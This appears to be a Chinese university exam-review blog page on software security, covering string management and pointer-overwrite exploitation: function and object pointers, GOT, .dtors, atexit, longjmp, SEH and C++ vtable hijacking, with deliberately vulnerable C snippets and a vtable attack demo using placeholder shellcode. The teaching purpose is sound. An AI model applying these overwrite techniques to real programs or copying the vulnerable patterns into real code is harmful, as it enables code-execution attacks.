<p>②错误处理：使用<strong>XXL库</strong>来执行错误处理。为C和C++提供了<strong>异常和资产管理，</strong>调用者负责<strong>处理异常</strong>。如果没有<strong>指定异常处理程序</strong>，则默认情况下<strong>输出消息到stderr，调用abort()<strong>。依赖XXL可能会出现一个问题，因为</strong>两个库需要用来支持这个解决方案</strong>。</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/09c2a25d9155e4d4fd992409778bb9a.png" alt="09c2a25d9155e4d4fd992409778bb9a.png"></p>
<p>（2）管理字符串</p>
<p><strong>①管理动态字符串</strong>：<strong>分配缓冲区。</strong>如果需要额外的内存，则<strong>重新调整内存大小。</strong></p>
<p>②管理字符串操作以确保<strong>字符串操作没有导致缓冲区溢出，数据没有丢失，字符串正常终止</strong>(字符串可能是也可能不是内部空结尾)。</p>
<p>③缺点：无限制地<strong>消耗内存</strong>，可能导致<strong>拒绝服务攻击</strong>，性能开销。</p>
<p>④数据类型：使用一个<strong>不透明的数据类型</strong>管理字符串。这种类型的特征是<strong>私有的，特定实现的。</strong></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/e3a0d693e89bdd2320765c13e03ab45.png" alt="e3a0d693e89bdd2320765c13e03ab45.png"></p>
<p>（3）<strong>黑名单</strong>：用<strong>下划线或其他无害的字符</strong>来取代<strong>危险的字符串输入。</strong></p>
<p>（4）<strong>白名单：</strong>定义<strong>可接受的字符列表</strong>，<strong>删除</strong>任何不可接受的字符。</p>
<p>（5）数据处理：字符串管理库通过确保字符串中的所有字符<strong>属于一组预定义的安全字符</strong>，来提供一种<strong>处理数据</strong>的机制。</p>
<h2 id="指针安全"><a href="#指针安全" class="headerlink" title="指针安全"></a>指针安全</h2><h3 id="网安内容"><a href="#网安内容" class="headerlink" title="网安内容"></a>网安内容</h3><p>1.指针安全的概念：是<strong>通过修改指针值来利用程序漏洞</strong>的方法的统称。可以通过<strong>覆盖函数指针</strong>将程序的<strong>控制权转移到攻击者提供的shellcode</strong>。也可以<strong>修改对象指针</strong>，从而执行任意代码。</p>
<p>2.缓冲区溢出覆写指针条件（考了n次）</p>
<p>（1）缓冲区与目标指针<strong>必须分配在同一个段内。</strong>比如，<strong>缓冲区和函数指针都未初始化，因此都存在于BSS段</strong>。</p>
<p>（2）缓冲区必须位于<strong>比目标指针更低的内存地址处。</strong></p>
<p>（3）该缓冲区必须是<strong>界限不充分的</strong>，因此容易被缓冲区溢出利用。</p>
<p>（4）缓冲区必须可以被缓冲区溢出利用。（废话）</p>
<p>3.<strong>UNIX可执行文件</strong>（包含data段和BSS段）相关概念</p>
<p>（1）<strong>data段</strong>包含了所有<strong>已初始化的全局变量和常数，BSS段</strong>包含了<strong>所有未初始化的全局变量</strong></p>
<p>（2）<strong>已初始化的全局变量和未初始化变量</strong>分开是为了让汇编器<strong>不将未初始化的变量内容写入目标文件</strong></p>
<p>要熟悉这段代码，练习题有，考某行代码存储空间在哪？</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> GLOBAL_INIT = <span class="number">1</span>; <span class="comment">/* data segment, global */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> global_uninit; <span class="comment">/* BSS segment, global */</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123; <span class="comment">/* stack, local */</span></span><br><span class="line"><span class="type">int</span> local_init = <span class="number">1</span>; <span class="comment">/* stack, local */</span></span><br><span class="line"><span class="type">int</span> local_uninit; <span class="comment">/* stack, local */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> local_static_init = <span class="number">1</span>; <span class="comment">/* data seg, local */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> local_static_uninit; <span class="comment">/* BSS segment, local */</span></span><br><span class="line"><span class="comment">/* storage for buff_ptr is stack, local */</span></span><br><span class="line"><span class="comment">/* allocated memory is heap, local */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>4.<strong>函数指针</strong>举例</p>
<p>考试练习题：什么情况缓冲区溢出？要记一下每行代码作用类似的。（考了n次）</p>
<p><strong>argv[1]的长度大于BUFFSIZE就会发生缓冲区溢出。</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">good_function</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span> &#123;</span><br><span class="line"><span class="comment">// do something</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Usage: prog_name &lt;string1&gt;\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> buff [BUFFSIZE]; <span class="comment">// 存储于BSS段</span></span><br><span class="line"><span class="type">static</span> <span class="title function_">void</span> <span class="params">(*funcPtr)</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span>; <span class="comment">// 存储于BSS段</span></span><br><span class="line">funcPtr = &amp;good_function;</span><br><span class="line"><span class="built_in">strncpy</span>(buff, argv[<span class="number">1</span>], <span class="built_in">strlen</span>(argv[<span class="number">1</span>])); **<span class="comment">// argv[1]的长度大于BUFFSIZE就会发生缓冲区溢出**</span></span><br><span class="line">(<span class="type">void</span>)(*funcPtr)(argv[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>程序存在漏洞可<strong>被缓冲区溢出利用</strong>。<strong>缓冲区和函数指针都未初始化</strong>，因此存在于BSS段。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">good_function</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span> &#123;...&#125; </span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> buff[BUFFSIZE]; <span class="comment">// **静态字符数组buff**</span></span><br><span class="line"><span class="type">static</span> <span class="title function_">void</span> <span class="params">(*funcPtr)</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span>; </span><br><span class="line"><span class="comment">// 当程序执行到**funcPtr标识的函数**的时候，**shellcode将会取代good_function()**得以执行</span></span><br><span class="line">funcPtr = &amp;good_function; <span class="comment">// funcPtr**都是未初始化的**，并且存储于**BSS段**</span></span><br><span class="line"><span class="built_in">strncpy</span>(buff, argv[<span class="number">1</span>], <span class="built_in">strlen</span>(argv[<span class="number">1</span>])); </span><br><span class="line">**<span class="comment">// 当argv[1]的长度大于BUFFSIZE的时候，就会发生缓冲区溢出**</span></span><br><span class="line">(<span class="type">void</span>)(*funcPtr)(argv[<span class="number">2</span>]); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>5.对象指针举例</p>
<p>考试练习题：哪一行会发生任意内存写？（考了n次）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">(<span class="type">void</span> * arg, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line"><span class="type">char</span> buff[<span class="number">100</span>]; <span class="comment">// 缓冲区容易**被漏洞利用**</span></span><br><span class="line"><span class="type">long</span> val = …; </span><br><span class="line"><span class="type">long</span> *ptr = …;</span><br><span class="line"><span class="built_in">memcpy</span>(buff, arg, len); </span><br><span class="line">*ptr = val; </span><br><span class="line">…</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>memcpy(buff, arg, len)：<strong>在溢出缓冲区后，攻击者可以覆写ptr和val</strong></li>
<li>*<strong>ptr &#x3D; val：会发生任意内存写</strong></li>
</ul>
<p><strong>6.修改指令指针</strong></p>
<p>（1）IC存储了<strong>将要执行的下一条指令地址</strong>。</p>
<p>（2）IC<strong>不能被直接访问</strong>，在<strong>顺序执行代码时递增</strong>，也可以由<strong>控制转移指令间接修改</strong>。比如jmp、Conditional jumps、call、ret。</p>
<p>（3）静态调用对于函数地址<strong>使用立即数</strong>：指令中地址被编码。<strong>计算地址，然后放入IC。</strong>不改变执行指令，<strong>IC不会改变。</strong></p>
<p>（4）<strong>IC的下一个值，存储在内存中</strong>，其可以被改变。可以通过函数指针调用（间接引用）。通过函数指针，可以间接地调用函数，即不是直接通过函数名来调用。</p>
<p>（5）控制IC使得<strong>攻击者可以选择要执行的代码，</strong>攻击者<strong>能够任意写的话很容易：</strong>借助<strong>指针变量</strong>进行赋值。<strong>间接的函数引用与无法在编译期间决定的函数调用可以被利用，</strong>从而使程序的<strong>控制权转移到任意代码</strong>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[]) &#123;</span><br><span class="line"><span class="keyword">if</span> (argc !=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Usage: prog_name\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="title function_">void</span> <span class="params">(*funcPtr)</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span>;</span><br><span class="line">funcPtr = &amp;good_function;</span><br><span class="line">(<span class="type">void</span>)(*funcPtr)(<span class="string">&quot;hi &quot;</span>); <span class="comment">// 使用指针调用good function</span></span><br><span class="line">good_function(<span class="string">&quot;there!\n&quot;</span>); <span class="comment">// 直接调用good function，不可以被覆写</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述代码反汇编：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">**(<span class="type">void</span>)(*funcPtr)(<span class="string">&quot;hi&quot;</span>);**</span><br><span class="line"><span class="number">00424178</span> mov esi, esp </span><br><span class="line"><span class="number">0042417</span>A push offset <span class="built_in">string</span> <span class="string">&quot;hi&quot;</span> (<span class="number">46802</span>Ch) </span><br><span class="line"><span class="number">0042417F</span> call dword ptr [funcPtr (<span class="number">478400</span>h)] </span><br><span class="line"><span class="comment">// 第一个调用good function机器码ff 15 **00 84 47 00**最后4个字节包含了**被调用函数的地址**</span></span><br><span class="line"><span class="number">00424185</span> add esp, <span class="number">4</span> </span><br><span class="line"><span class="number">00424188</span> cmp esi, esp</span><br><span class="line"></span><br><span class="line">**<span class="title function_">good_function</span><span class="params">(<span class="string">&quot;there!\n&quot;</span>)</span>;**</span><br><span class="line"><span class="number">0042418F</span> push offset <span class="built_in">string</span> <span class="string">&quot;there!\n&quot;</span> (<span class="number">468020</span>h) </span><br><span class="line"><span class="number">00424194</span> call good_function **(<span class="number">422479</span>h)** </span><br><span class="line"><span class="comment">// 第二个调用good function机器码e8 e0 e2 ff ff最后4字节**被调用函数的相对偏移量**</span></span><br><span class="line"><span class="number">00424199</span> add esp, <span class="number">4</span></span><br></pre></td></tr></table></figure>

<p>问题：存储在0x00478400中的<strong>地址是0x00422479</strong>，该地址表示<strong>good_function函数的入口地址</strong>。</p>
<p>7.修改指令指针的目标：<strong>全局偏移表</strong></p>
<p>（1）ELF默认二进制格式，GOT被包含在<strong>ELF的二进制文件的进程空间里</strong>。<strong>GOT存放绝对地址。</strong></p>
<p>（3）GOT程序首次使用一个函数前，GOT入口项<strong>包含运行时连接器RTL的地址。</strong>如果该函数被程序调用，则程序的<strong>控制权被转移到RTL</strong>，然后函数的<strong>实际地址被确定且被插入到GOT中</strong>，接下来就可以<strong>通过GOT中的入口项直接调用函数。</strong></p>
<p>（4）在ELF可执行文件中的GOT入口项的地址<strong>是固定的。</strong>对任何可执行进程映像而言<strong>GOT入口项都位于相同的地址。</strong>可以利用<strong>objdump命令查看某一个函数的GOT入口项位置。</strong></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2043.png" alt="image.png"></p>
<p>（5）如何利用GOT：攻击者<strong>需要有自己的shellcode</strong>，攻击者需要<strong>能够向任意地址写入任意值</strong>。攻击者<strong>用自己的shellcode地址覆写GOT地址</strong>（将要被使用的）</p>
<p>8.修改指令指针的目标</p>
<p><strong>（1）.dtors区</strong></p>
<ul>
<li><strong>constructor</strong>属性：函数<strong>在main()之前</strong>被调用</li>
<li><strong>destructor</strong>属性：函数将<strong>在main()执行完成后</strong>进行调用</li>
<li>构造函数和析构函数分别存储于生成的ELF可执行映像的.ctors和.dtors区中</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">create</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">__<span class="title function_">ttribute__</span> <span class="params">((constructor))</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">destroy</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">__<span class="title function_">attribute__</span> <span class="params">((destructor))</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;create: %p.\n&quot;</span>, create);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;destroy: %p.\n&quot;</span>, destroy);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_SUCCESS);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">create</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;create called.\n&quot;</span>);&#125;</span><br><span class="line"><span class="comment">/* create called. create: 0x80483a0. destroy: 0x80483b8. destroy called. */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">destroy</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;destroy called.\n&quot;</span>);&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>这两个区都有如下的布局形式：0xffffffff {function-address} 0x00000000</li>
<li>.ctors和.dtors区映射到进程地址空间后，<strong>默认属性为可写</strong></li>
<li>漏洞利用程序<strong>从未利用过构造函数</strong>，因为它们<strong>都在main()函数之前执行</strong></li>
<li>攻击者的兴趣<strong>集中在析构函数和.dtors区上</strong></li>
<li>可以<strong>使用objdump命令检查可执行映像中.dtors区</strong>中的内容</li>
<li>攻击者可以通过<strong>覆写.dtors区中的函数指针的地址</strong>从而将<strong>程序控制权转移到任意的代码</strong></li>
<li>如果攻击者能够读取到目标二进制文件，那么通过分析ELF映像，很容易就能确定要覆写的确切位置。即使没有指定任何析构函数，.dtors区仍然存在。在这种情况下.dtors区中只含有头、尾标签而中间没有函数地址、仍然可以通过将尾标签0x00000000覆写未攻击者提供的外壳代码的地址，从而将控制转移过去。如果外壳代码返回，则进程将会继续调用接下来的函数直到遇到尾标签或发现错误为止。</li>
<li>对于攻击者而言，覆写.dtors区的好处在于：<strong>该区总是存在并且会映射到内存中</strong></li>
<li>然而：.dtors仅存在于用GCC编译和链接的程序中。有时候很难找到合适的外壳代码注入点，使得在main()退出后外壳代码仍然能够驻留在内存中</li>
</ul>
<p><strong>（2）atexit()、on_exit()</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> *glob;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, glob);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">atexit(test);</span><br><span class="line">glob = <span class="string">&quot;Exiting.\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>atexit()通过<strong>向一个退出时将被调用的已有函数数组中添加指定的函数</strong>完成工作</li>
<li>exit()以后进先出（Last-in, First-out, LIFO）的顺序调用函数</li>
<li>数组被分配为全局性的符号：__atexit in BSD、__exit_funcs in Linux</li>
</ul>
<p>练习题出现了以下例子：</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2044.png" alt="image.png"></p>
<ul>
<li>在该调试会话中，<strong>在main()中调用atexit()之前设了一个断点</strong>，然后运行程序。</li>
<li>接下来<strong>执行atexit()函数，注册test()函数。</strong>在test()函数注册后，显示了在__exit_funcs位置处的内存。</li>
<li>每一个函数都保存在由4个双字构成的结构中，每一个结构的最后一个双字保存着函数的实际地址。</li>
<li>示例中：<strong>3个函数已经被注册。</strong>_dl_fini()、__libc_csu_fini()、test()。攻击者可以<strong>覆写__exit_funcs结构</strong>。其中test()地址为<strong>0x080483c8.</strong></li>
</ul>
<p><strong>（3）longjmp()</strong></p>
<ul>
<li>用于处理程序的低级子程序中遇到的错误和中断。setjmp()宏<strong>保存调用环境</strong>。longjmp()，siglongjmp()非局部的跳转到保存的栈环境。</li>
<li>longjmp()返回控制权给调用set_jmp()的指针。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;setjmp.h&gt;</span></span></span><br><span class="line">jmp_buf buf;</span><br><span class="line"><span class="type">void</span> <span class="title function_">g</span><span class="params">(<span class="type">int</span> n)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">h</span><span class="params">(<span class="type">int</span> n)</span>;</span><br><span class="line"><span class="type">int</span> n = <span class="number">6</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">f</span><span class="params">(<span class="type">void</span>)</span>&#123; setjmp(buf); g(n);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">g</span><span class="params">(<span class="type">int</span> n)</span>&#123; h(n);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">h</span><span class="params">(<span class="type">int</span> n)</span> &#123; longjmp(buf, <span class="number">2</span>);&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">f();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>jmp_buf的Linux实现：注意JB_PC域，这是攻击目标。任意写可以<strong>用缓冲区溢出shellcode的地址覆盖这个字段。</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> __jmp_buf[<span class="number">6</span>];</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> JB_BX 0</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> JB_SI 1</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> JB_DI 2</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> JB_BP 3</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> JB_SP 4</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> JB_PC 5</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> JB_SIZE 24</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">jmp_buf_tag</span> &#123;</span></span><br><span class="line">__jmp_buf __jmpbuf; </span><br><span class="line"><span class="type">int</span> __mask_was_saved; </span><br><span class="line"><span class="type">__sigset_t</span> __saved_mask; </span><br><span class="line">&#125; jmp_buf[<span class="number">1</span>]</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">longjmp(env, i) </span><br><span class="line">movl i, %eax <span class="comment">/* return i */</span></span><br><span class="line">movl env.__jmpbuf[JB_BP], %ebp <span class="comment">// movl指令恢复BP</span></span><br><span class="line">movl env.__jmpbuf[JB_SP], %esp <span class="comment">// movl指令恢复栈指针</span></span><br><span class="line">jmp (env.__jmpbuf[JB_PC]) <span class="comment">// 将程序控制权转移到保存的PC</span></span><br></pre></td></tr></table></figure>

<p><strong>（4）异常处理</strong></p>
<ul>
<li>异常：函数操作中<strong>发生的意外情况。</strong></li>
<li>三种形式异常处理程序：<strong>向量化异常处理VEH</strong>、<strong>结构化异常处理SEH</strong>、<strong>系统默认异常处理。</strong></li>
</ul>
<p>①SEH：通过try…catch块实现</p>
<ul>
<li>try块中引发的任何异常<strong>都将被匹配的catch块处理</strong></li>
<li>如果catch块无法处理该异常，<strong>那么它将被传回之前的范围块</strong></li>
<li>__finally被调用来<strong>清理由try块说明的任何东西。</strong></li>
</ul>
<p>②栈帧初始化需注意：<strong>异常处理程序地址紧跟在局部变量之后</strong>。如果栈变量发生缓冲区溢出，那么<strong>异常处理程序地址就可以被覆写。</strong></p>
<ul>
<li><strong>攻击者可以覆写异常处理程序地址，替换TEB中的指针。</strong>TEB包含<strong>已注册的异常处理程序列表。</strong>攻击者仿造一个<strong>列表入口</strong>作为攻击代码的一部分，利用<strong>任意内存写技术修改第一个异常处理程序域。</strong></li>
<li>Windows为进程提供了一个<strong>全局异常过滤器和处理程序</strong>，如果之前的异常处理程序都没能处理异常，那么该处理程序就会被调用。</li>
<li>往往为整个进程实现一个未处理异常，使得程序能够<strong>优雅地处理非预期的错误</strong>或者<strong>只是为了调试方便。</strong></li>
<li><strong>未处理异常过滤器函数</strong>利用SetUnhandledExceptionFilter()函数进行设置。</li>
<li>如果攻击者利用<strong>任意内存写技术</strong>覆盖了某特定内存地址，则<strong>未处理异常过滤器</strong>可以被<strong>重定向去执行</strong>任意代码。</li>
</ul>
<p><strong>（5）虚函数</strong></p>
<p>①面向<strong>对象编程</strong>的重要特性，<strong>允许函数调用的动态绑定。</strong></p>
<p>②虚函数是<strong>类成员函数</strong>，用<strong>virtual关键字</strong>声明，可<strong>由派生类中的同名函数重写</strong>，函数调用在运行时解析。</p>
<p>③虚函数实现：<strong>虚函数表VTBL。VTBL是一个函数指针数组，</strong>用于在运行时<strong>派发虚函数调用在每一个对象的头部</strong>，都包含一个<strong>指向VTBL的虚指针VPTR。</strong>VTBL含有<strong>指向虚函数的每一个实现的指针</strong>。</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2045.png" alt="image.png"></p>
<p>④攻击者可以<strong>覆写VTBL中的函数指针</strong>，<strong>改写VPTR</strong>使其<strong>指向其他任意的VTBL。</strong></p>
<p>⑤攻击者可以通过<strong>任意内存写</strong>或者<strong>利用缓冲区溢出直接写入对象</strong>实现这一操作。</p>
<p>10.缓解措施</p>
<p>（1）<strong>消除允许内存被不正确地覆写的漏洞</strong>。这些错误出现在：<strong>覆写对象指针、常见的动态内存管理错误、字符串格式化漏洞。</strong></p>
<p>（2）<strong>减少目标暴露：</strong>W^X写或执行，只可其一。<strong>降低有漏洞的进程的权限</strong>。内存区域<strong>要么可写要么可执行，但不可同时二者兼备。</strong></p>
<p>（3）<strong>栈探测仪。</strong>能够保护<strong>通过溢出栈缓冲区</strong>来覆写栈指针或者其他保护区域的漏洞利用。<strong>不能保护</strong>包括<strong>栈段</strong>在内的任何位置发生缓冲区溢出。修改的漏洞利用：<strong>变量、对象指针、函数指针。</strong></p>
<p>11.虚函数攻击</p>
<p>（1）背景：多态是<strong>面向对象</strong>的一个重要特性，在C++中这个特性主要靠<strong>对虚函数的动态调用</strong>来实现。</p>
<p>（2）相关理解：</p>
<p>①C++类的成员函数在声明时，若<strong>使用关键字virtual进行修饰</strong>，<strong>则被称为虚函数。</strong></p>
<p>②一个类中可能有<strong>很多个虚函数</strong>。虚函数的入口地址<strong>被统一保存在虚表中</strong>。</p>
<p>③对象在使用虚函数时，<strong>先通过虚表指针找到虚表</strong>，然后<strong>从虚表中取出最终的函数入口地址</strong>进行调用。</p>
<p>④虚表指针保存在<strong>对象的内存空间中</strong>，紧接着虚表指针的是<strong>其他成员变量</strong>。</p>
<p>⑤虚函数只有<strong>通过对象指针的引用</strong>才能显示出其<strong>动态调用</strong>的特性。</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2046.png" alt="image.png"></p>
<p>虚函数攻击代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span>[] shellcode=<span class="string">&quot;......&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vf</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line"><span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line">virtual <span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Class Vtable::test()&quot;</span>&lt;&lt;<span class="built_in">endl</span>;&#125;</span><br><span class="line">&#125;;</span><br><span class="line">vf overflow, *p;</span><br><span class="line"><span class="comment">// 这段程序声明了一个类，**具有buf和虚函数test**，声明它的实例overflow和指针p。</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">LoadLibrary(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line"><span class="type">char</span> * p_vtable;</span><br><span class="line">p_vtable = overflow.buf<span class="number">-4</span>;<span class="comment">// point to virtual table</span></span><br><span class="line">__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line"><span class="comment">// reset fake virtual table to 0x0042E430</span></span><br><span class="line"><span class="comment">// the address may need to adjusted via runtime debug</span></span><br><span class="line">p_vtable[<span class="number">0</span>]=<span class="number">0x30</span>;</span><br><span class="line">p_vtable[<span class="number">1</span>]=<span class="number">0xE4</span>;</span><br><span class="line">p_vtable[<span class="number">2</span>]=<span class="number">0x42</span>;</span><br><span class="line">p_vtable[<span class="number">3</span>]=<span class="number">0x00</span>;</span><br><span class="line"><span class="built_in">strcpy</span>(overflow.buf,shellcode1);<span class="comment">// set fake virtual function pointer</span></span><br><span class="line">p=&amp;overflow;</span><br><span class="line">p-&gt;test();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>（3）流程：</p>
<p>①虚表指针<strong>位于成员变量char buf[200]之前</strong>，程序中通过p_vtable &#x3D; overflow.buf-4定位到这个指针。</p>
<p>②<strong>修改虚表指针</strong>指向缓冲区的<strong>0x0042E430处</strong>（第一次得不到，需要通过调试得到）。</p>
<p>③程序执行到<strong>p-&gt;test()<strong>时，将按照</strong>伪造的虚函数指针</strong>去0x0042E430寻找虚表，这里正好是缓冲区里<strong>shellcode的末尾</strong>。在这里填上shellcode的起始位置0x0042E35C作为<strong>伪造的虚函数入口地址</strong>，程序将最终跳去<strong>执行shellcode。</strong></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2047.png" alt="image.png"></p>
<p>（4）由于虚表指针<strong>位于成员变量之前</strong>，<strong>溢出只能向后覆盖数据</strong>，所以很可惜这种利用方式在栈溢出场景下有一定局限性。当然，如果内存中<strong>存在多个对象且能够溢出到下一个对象空间中去</strong>，连续性覆盖还是有攻击的机会的，比如下图这种情况。</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2048.png" alt="image.png"></p>
<h3 id="信安补充解释内容"><a href="#信安补充解释内容" class="headerlink" title="信安补充解释内容"></a>信安补充解释内容</h3><p>1.SEH相关知识：SEH即<strong>异常处理结构体</strong>，它是Windows异常处理机制所采用的重要数据结构。每个H包含两个DWORD指针：<strong>SEH链表指针和异常处理函数句柄</strong>，共8个字节。</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2049.png" alt="image.png"></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2050.png" alt="image.png"></p>
